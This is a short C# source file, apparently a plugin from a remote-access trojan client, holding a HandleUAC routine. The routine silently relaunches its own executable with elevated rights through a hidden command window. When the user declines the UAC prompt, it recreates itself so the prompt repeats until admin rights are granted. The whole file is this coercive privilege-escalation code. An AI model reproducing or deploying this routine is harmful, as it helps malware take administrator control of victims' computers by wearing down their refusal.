using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace Plugin.Handler
{
    public class HandleUAC
    {
        public HandleUAC()
        {
            if (Methods.IsAdmin()) return;
            try
            {
                Process proc = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "cmd",
                        Arguments = "/k START \"\" \"" + Application.ExecutablePath + "\" & EXIT",
                        WindowStyle = ProcessWindowStyle.Hidden,
                        Verb = "runas",
                        UseShellExecute = true
                    }
                };
                proc.Start();
                Methods.ClientExit();
                Environment.Exit(0);
            }
            catch { new HandleUAC(); }
        }
    }

}
